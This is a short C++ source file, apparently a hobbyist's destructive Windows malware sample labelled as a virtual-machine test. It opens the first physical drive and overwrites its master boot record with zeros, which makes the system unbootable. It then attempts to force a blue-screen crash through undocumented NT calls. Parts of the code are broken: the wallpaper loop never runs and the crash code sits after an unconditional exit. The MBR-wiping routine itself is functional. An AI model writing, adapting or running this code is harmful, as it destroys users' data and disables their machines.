// This code was been writen by Manta.
// Telegram @eu_manta
// Testing for Virtual Mashine

#include <iostream>
#include <Windows.h>
#include <string>

#pragma comment(lib, "ntdll.lib")

using namespace std;

#define MBR_SIZE 512

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);

int main()
{
    // Change Wallpaper 
    const string path_to_wallpaper = "";
    while (path_to_wallpaper != "") {
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, "path to wallpaper", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, "path to wallpaper", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, "path to wallpaper", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, "path to wallpaper", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

    }
    

    Sleep(10);

    

    // Delete MBR..
    DWORD write;

    char mbr[MBR_SIZE];

    ZeroMemory(&mbr, (sizeof mbr));

    HANDLE MasterBootRecord = CreateFile(L"\\\\.\\PhysicalDrive0",
        GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        NULL,
        NULL);

    if (WriteFile(MasterBootRecord, mbr, MBR_SIZE, &write, NULL) == TRUE) {
        cout << "Bye mbr catalog.";

        Sleep(3000);

        ExitProcess(0);
    }
    else {
        cout << "Something has gone wrong!" << endl;

        Sleep(3000);

        ExitProcess(0);
    }

    CloseHandle(MasterBootRecord);

    

    // BSOD SCREEN
    BOOLEAN b;

    unsigned long response;

    RtlAdjustPrivilege(19, true, false, &b);

    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);

    return 0;
}

